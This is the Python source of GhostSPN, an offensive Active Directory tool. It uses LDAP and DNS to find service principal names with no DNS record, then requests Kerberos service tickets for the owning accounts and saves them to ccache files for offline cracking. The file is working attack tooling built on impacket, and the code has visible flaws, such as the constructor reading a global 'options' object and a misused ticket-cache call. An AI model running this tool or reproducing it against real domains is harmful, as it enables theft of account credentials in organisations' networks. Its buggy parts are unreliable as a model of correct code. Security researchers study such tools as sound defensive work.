#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : GhostSPN.py
# Author             : Podalirius (@podalirius_)
# Date created       : 9 Jan 2023

import argparse
import binascii
import dns.resolver
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.ntlm import compute_lmhash, compute_nthash
import os
import re
from sectools.windows.ldap import raw_ldap_query, init_ldap_session
from sectools.windows.crypto import parse_lm_nt_hashes


VERSION = "1.1"


def parse_spn(spn):
    # Source: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/cd328386-4d97-4666-be33-056545c1cad2
    # serviceclass "/" hostname [":"port | ":"instancename] ["/" servicename]
    data = {"serviceclass": None, "hostname": None, "port": None, "instancename": None, "servicename": None}

    matched = re.match(
        r"^([^/]+)/([^/:]+)(:(([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])|([^/]+)))?(/(.*))?",
        spn)
    if matched is not None:
        serviceclass, hostname, _, _, port, instancename, _, servicename = matched.groups()
        data["serviceclass"] = serviceclass
        data["hostname"] = hostname
        if port is not None:
            data["port"] = int(port)
        if instancename is not None:
            data["instancename"] = instancename
        if instancename is not None:
            data["servicename"] = servicename
    return data


class MicrosoftDNS(object):
    """
    Documentation for class MicrosoftDNS
    """

    def __init__(self, dnsserver, verbose=False):
        super(MicrosoftDNS, self).__init__()
        self.dnsserver = dnsserver
        self.verbose = verbose

    def resolve(self, target_name):
        target_ips = []
        for rdtype in ["A", "AAAA"]:
            dns_answer = self.get_record(value=target_name, rdtype=rdtype)
            if dns_answer is not None:
                for record in dns_answer:
                    target_ips.append(record.address)
        if self.verbose and len(target_ips) == 0:
            print("[debug] No records found for %s." % target_name)
        return target_ips

    def get_record(self, rdtype, value):
        dns_resolver = dns.resolver.Resolver()
        dns_resolver.nameservers = [self.dnsserver]
        dns_answer = None
        # Try UDP
        try:
            dns_answer = dns_resolver.resolve(value, rdtype=rdtype, tcp=False)
        except dns.resolver.NXDOMAIN:
            # the domain does not exist so dns resolutions remain empty
            pass
        except dns.resolver.NoAnswer as e:
            # domains existing but not having AAAA records is common
            pass
        except dns.resolver.NoNameservers as e:
            pass
        except dns.exception.DNSException as e:
            pass

        if dns_answer is None:
            # Try TCP
            try:
                dns_answer = dns_resolver.resolve(value, rdtype=rdtype, tcp=True)
            except dns.resolver.NXDOMAIN:
                # the domain does not exist so dns resolutions remain empty
                pass
            except dns.resolver.NoAnswer as e:
                # domains existing but not having AAAA records is common
                pass
            except dns.resolver.NoNameservers as e:
                pass
            except dns.exception.DNSException as e:
                pass

        if self.verbose and dns_answer is not None:
            for record in dns_answer:
                print("[debug] '%s' record found for %s: %s" % (rdtype, value, record.address))

        return dns_answer


class GhostSPNLookup(object):
    """
    Documentation for class GhostSPNLookup
    """

    def __init__(self, auth_domain, auth_username, auth_password, auth_hashes, auth_dc_ip, kerberos_aeskey=None, kerberos_kdcip=None, verbose=False, debug=False):
        super(GhostSPNLookup, self).__init__()
        self.verbose = verbose
        self.debug = debug
        if self.debug:
            self.verbose = True

        # objects known to exist
        self.cache = {}

        self.auth_domain = options.domain
        self.auth_username = options.username
        self.auth_password = options.password
        self.auth_hashes = options.hashes
        self.__lmhash, self.__nthash = parse_lm_nt_hashes(self.auth_hashes)
        self.__kerberos_aes_key = kerberos_aeskey
        self.__kerberos_kdc_ip = kerberos_kdcip
        self.auth_dc_ip = options.dc_ip

        self.microsoftdns = MicrosoftDNS(dnsserver=self.auth_dc_ip, verbose=self.debug)

        # Consistency check
        self.__wildcard_dns_cache = {}
        self.check_wildcard_dns()

    def list_ghost_spns(self, request=False, sAMAccounName=None, servicePrincipalName=None):
        print("[>] Searching for Ghost SPNs ...")

        ldap_query = "(&(servicePrincipalName=*))"
        results = raw_ldap_query(
            query=ldap_query,
            auth_domain=self.auth_domain,
            auth_dc_ip=self.auth_dc_ip,
            auth_username=self.auth_username,
            auth_password=self.auth_password,
            auth_hashes=self.auth_hashes,
            attributes=["sAMAccountName", "servicePrincipalName", "userPrincipalName", "userAccountControl", "distinguishedName"]
        )

        if len(results) != 0:
            for dn, userdata in results.items():
                print_dn = True
                # Filter on sAMAccountName
                if sAMAccounName is not None:
                    if sAMAccounName.lower() not in userdata["sAMAccountName"].lower():
                        continue
                if self.verbose:
                    print_dn = False
                    self.__print_dn_with_properties(dn, userdata["userAccountControl"])

                for spn in sorted(userdata["servicePrincipalName"]):
                    # Filter on servicePrincipalName
                    if servicePrincipalName is not None:
                        if servicePrincipalName.lower() not in spn.lower():
                            continue
                    #
                    hosts_exists, wildcard_resolved = self.is_ghost_spn(userdata, spn)
                    # It is a ghost spn, with no DNS entry
                    if not hosts_exists and not wildcard_resolved:
                        if print_dn and not self.verbose:
                            print_dn = False
                            self.__print_dn_with_properties(dn, userdata["userAccountControl"])
                        print("    - \x1b[91;1m[vulnerable] %s\x1b[0m" % spn)
                        if request:
                            self.kerberos_get_tgs(userdata["sAMAccountName"], spn)
                    # Check if it was a wildcard dns entry
                    elif wildcard_resolved:
                        if print_dn and not self.verbose:
                            print_dn = False
                            self.__print_dn_with_properties(dn, userdata["userAccountControl"])
                        print("    - \x1b[93;1m[probably vulnerable] %s (resolved through a DNS wildcard)\x1b[0m" % spn)
                        if request:
                            self.kerberos_get_tgs(userdata["sAMAccountName"], spn)
                    # DNS entry exists, without wildcard
                    else:
                        if self.verbose:
                            print("    - \x1b[92;1m[not vulnerable] %s\x1b[0m" % spn)
        else:
            print("[!] No account were found with servicePrincipalNames.")
        print("[+] All done, bye bye!")

    def __print_dn_with_properties(self, dn, uac):
        disabled, delegation = "", ""

        if (uac & UF_ACCOUNTDISABLE) == UF_ACCOUNTDISABLE:
            disabled = "(\x1b[94;1maccount disabled\x1b[0m)"

        if (uac & UF_TRUSTED_FOR_DELEGATION) == UF_TRUSTED_FOR_DELEGATION:
            delegation = '(\x1b[94;1munconstrained delegation\x1b[0m)'
        elif (uac & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
            delegation = '(\x1b[94;1mconstrained delegation\x1b[0m)'

        print("[>] %s %s%s" % (dn, disabled, delegation))

    def is_ghost_spn(self, userdata, spn):
        spn_data = parse_spn(spn)

        # Relative name
        if "." not in spn_data["hostname"]:
            # Extract domain from distinguishedName
            domain = []
            for dc in userdata["distinguishedName"].split(','):
                if dc.lower().startswith("dc="):
                    domain.append(dc.split('=', 1)[1])
            domain = '.'.join(domain)
            fqdn = spn_data["hostname"] + "." + domain
        # Already is a FQDN
        else:
            fqdn = spn_data["hostname"]

        if fqdn in self.cache.keys():
            hosts_exists, is_dns_wildcard = True, False
        else:
            hosts_exists, is_dns_wildcard = self.lookup(fqdn)

        return hosts_exists, is_dns_wildcard

    def lookup(self, fqdn):
        hosts_exists, is_dns_wildcard = False, False
        results = self.microsoftdns.resolve(fqdn)

        if len(results) != 0:
            # Cache results
            if fqdn not in self.cache.keys():
                self.cache[fqdn] = []
            self.cache[fqdn] = sorted(list(set(self.cache[fqdn] + results)))
            hosts_exists, is_dns_wildcard = True, False

            # Check for wildcards
            for result in results:
                for wildcard in self.__wildcard_dns_cache.keys():
                    regex = re.sub('\\.', '\\.', wildcard)
                    regex = re.sub('^\\*', '^[^.]*', regex)

                    if re.match(regex, fqdn, re.IGNORECASE):
                        if result in self.__wildcard_dns_cache[wildcard].keys():
                            hosts_exists, is_dns_wildcard = False, True
        else:
            hosts_exists, is_dns_wildcard = False, False

        return hosts_exists, is_dns_wildcard

    def check_wildcard_dns(self):
        auth_lm_hash, auth_nt_hash = parse_lm_nt_hashes(self.auth_hashes)

        ldap_server, ldap_session = init_ldap_session(
            auth_domain=self.auth_domain,
            auth_dc_ip=self.auth_dc_ip,
            auth_username=self.auth_username,
            auth_password=self.auth_password,
            auth_lm_hash=auth_lm_hash,
            auth_nt_hash=auth_nt_hash,
            use_ldaps=False
        )

        target_dn = "CN=MicrosoftDNS,DC=DomainDnsZones," + ldap_server.info.other["rootDomainNamingContext"][0]

        ldapresults = list(ldap_session.extend.standard.paged_search(target_dn, "(&(objectClass=dnsNode)(dc=\\2A))", attributes=["distinguishedName", "dNSTombstoned"]))

        results = {}
        for entry in ldapresults:
            if entry['type'] != 'searchResEntry':
                continue
            results[entry['dn']] = entry["attributes"]

        if len(results.keys()) != 0:
            print("[!] WARNING! Wildcard DNS entries found, dns resolution will not be consistent.")
            for dn, data in results.items():
                fqdn = re.sub(',CN=MicrosoftDNS,DC=DomainDnsZones,DC=DOMAIN,DC=local$', '', dn)
                fqdn = '.'.join([dc.split('=')[1] for dc in fqdn.split(',')])

                ips = self.microsoftdns.resolve(fqdn)

                if data["dNSTombstoned"]:
                    print("  | %s ──> %s (set to be removed)" % (dn, ips))
                else:
                    print("  | %s ──> %s" % (dn, ips))

                # Cache found wildcard dns
                for ip in ips:
                    if fqdn not in self.__wildcard_dns_cache.keys():
                        self.__wildcard_dns_cache[fqdn] = {}
                    if ip not in self.__wildcard_dns_cache[fqdn].keys():
                        self.__wildcard_dns_cache[fqdn][ip] = []
                    self.__wildcard_dns_cache[fqdn][ip].append(data)
            print()
        return results

    def kerberos_get_tgs(self, vulnerable_user, spn):
        # Get a TGT for the current user ===============================================================================
        if self.debug:
            if self.auth_domain is not None:
                print("      [debug] Getting a TGT for the current user (%s\\%s)" % (self.auth_domain, self.auth_username))
            else:
                print("      [debug] Getting a TGT for the current user (%s)" % self.auth_username)
        domain, _, TGT, _ = CCache.parseFile(self.auth_domain)
        if TGT is not None:
            return TGT
        # No TGT in cache, request it
        userName = Principal(self.auth_username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.auth_password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    clientName=userName,
                    password='',
                    domain=self.auth_domain,
                    lmhash=compute_lmhash(self.auth_password),
                    nthash=compute_nthash(self.auth_password),
                    aesKey=self.__kerberos_aes_key,
                    kdcHost=self.__kerberos_kdc_ip
                )
            except Exception as e:
                if self.verbose:
                    print('[error] TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    clientName=userName,
                    password=self.auth_password,
                    domain=self.auth_domain,
                    lmhash=binascii.unhexlify(self.__lmhash),
                    nthash=binascii.unhexlify(self.__nthash),
                    aesKey=self.__kerberos_aes_key,
                    kdcHost=self.__kerberos_kdc_ip
                )
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                clientName=userName,
                password=self.auth_password,
                domain=self.auth_domain,
                lmhash=binascii.unhexlify(self.__lmhash),
                nthash=binascii.unhexlify(self.__nthash),
                aesKey=self.__kerberos_aes_key,
                kdcHost=self.__kerberos_kdc_ip
            )
        if self.debug:
            print("      [debug] Successfully got TGT.")
        # TGT data
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        # Get TGS ===============================================================================
        if self.debug:
            if "\x00" in vulnerable_user:
                print("      [debug] Getting a TGS for the user (%s)" % vulnerable_user.decode('utf-16-le'))
            else:
                print("      [debug] Getting a TGS for the user (%s)" % vulnerable_user)

        principalName = Principal()
        principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
        principalName.components = [vulnerable_user]
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
            serverName=principalName,
            domain=self.auth_domain,
            kdcHost=self.__kerberos_kdc_ip,
            tgt=TGT['KDC_REP'],
            cipher=TGT['cipher'],
            sessionKey=TGT['sessionKey']
        )

        # Save TGS to CCache ===============================================================================
        # Save the ticket
        if self.debug:
            if "\x00" in vulnerable_user:
                print("      [debug] Saving TGS of user (%s)" % vulnerable_user.decode('utf-16-le'))
            else:
                print("      [debug] Saving TGS of user (%s)" % vulnerable_user)

        ccache = CCache()
        try:
            ccache.fromTGS(tgs, oldSessionKey, sessionKey)
            if not os.path.exists("./ghostspn_tgs/"):
                os.makedirs("./ghostspn_tgs/")
            path_safe_spn = spn.replace('/', '_')
            ccache.saveFile('./ghostspn_tgs/%s_%s.ccache' % (vulnerable_user, path_safe_spn))
        except Exception as e:
            print("[error] %s" % str(e))
        else:
            print("[+] Saved TGS ./ghostspn_tgs/%s_%s.ccache" % (vulnerable_user, path_safe_spn))


def parseArgs():
    print("GhostSPN v%s - by @podalirius_\n" % VERSION)

    parser = argparse.ArgumentParser(description="GhostSPN")

    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    parser.add_argument("--debug", default=False, action="store_true", help='Debug mode. (default: False)')

    # Creating the "scan" subparser ==============================================================================================================
    mode_scan = argparse.ArgumentParser(add_help=False)
    # Credentials
    mode_scan_credentials = mode_scan.add_argument_group("Credentials")
    mode_scan_credentials.add_argument("-u", "--username", default="", help="Username to authenticate to the machine.")
    mode_scan_credentials.add_argument("-p", "--password", default="", help="Password to authenticate to the machine. (if omitted, it will be asked unless -no-pass is specified)")
    mode_scan_credentials.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the machine.")
    mode_scan_credentials.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    mode_scan_credentials.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    mode_scan_credentials.add_argument("--dc-ip", required=True, action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    mode_scan_credentials.add_argument("--ldaps", default=False, action="store_true", help='Use LDAPS. (default: False)')
    mode_scan_credentials.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    mode_scan_credentials.add_argument("--debug", default=False, action="store_true", help='Debug mode. (default: False)')
    # Target
    mode_scan_target = mode_scan.add_argument_group("Target")
    mode_scan_target.add_argument("-tu", "--target-username", default=None, required=None, help="Target username to request TGS for.")
    mode_scan_target.add_argument("-ts", "--target-spn", default=None, required=None, help="Target Ghost SPN to request TGS for.")

    # Creating the "request" subparser ==============================================================================================================
    mode_request = argparse.ArgumentParser(add_help=False)
    # Credentials
    mode_request_credentials = mode_request.add_argument_group("Credentials")
    mode_request_credentials.add_argument("-u", "--username", default="", help="Username to authenticate to the machine.")
    mode_request_credentials.add_argument("-p", "--password", default="", help="Password to authenticate to the machine. (if omitted, it will be asked unless -no-pass is specified)")
    mode_request_credentials.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the machine.")
    mode_request_credentials.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    mode_request_credentials.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    mode_request_credentials.add_argument("--dc-ip", required=True, action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    mode_request_credentials.add_argument("--ldaps", default=False, action="store_true", help='Use LDAPS. (default: False)')
    mode_request_credentials.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    mode_request_credentials.add_argument("--debug", default=False, action="store_true", help='Debug mode. (default: False)')
    # Kerberos
    mode_request_kerberos = mode_request.add_argument_group("Kerberos")
    mode_request_kerberos.add_argument('--aes-key', default=None, metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    mode_request_kerberos.add_argument('--kdc-ip', default=None, help='')
    # Target
    mode_request_target = mode_request.add_argument_group("Target")
    mode_request_target.add_argument("-tu", "--target-username", default=None, required=None, help="Target username to request TGS for.")
    mode_request_target.add_argument("-ts", "--target-spn", default=None, required=None, help="Target Ghost SPN to request TGS for.")

    # Adding the subparsers to the base parser
    subparsers = parser.add_subparsers(help="Mode", dest="mode", required=True)
    mode_scan_parser = subparsers.add_parser("scan", parents=[mode_scan], help="")
    mode_request_parser = subparsers.add_parser("request", parents=[mode_request], help="")

    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    if options.mode == "scan":
        g = GhostSPNLookup(
            auth_domain=options.domain,
            auth_dc_ip=options.dc_ip,
            auth_username=options.username,
            auth_password=options.password,
            auth_hashes=options.hashes,
            verbose=options.verbose,
            debug=options.debug
        )

        g.list_ghost_spns(
            sAMAccounName=options.target_username,
            servicePrincipalName=options.target_spn
        )

    elif options.mode == "request":
        g = GhostSPNLookup(
            auth_domain=options.domain,
            auth_dc_ip=options.dc_ip,
            auth_username=options.username,
            auth_password=options.password,
            auth_hashes=options.hashes,
            kerberos_aeskey=options.aes_key,
            kerberos_kdcip=options.kdc_ip,
            verbose=options.verbose,
            debug=options.debug
        )

        g.list_ghost_spns(
            request=True,
            sAMAccounName=options.target_username,
            servicePrincipalName=options.target_spn
        )
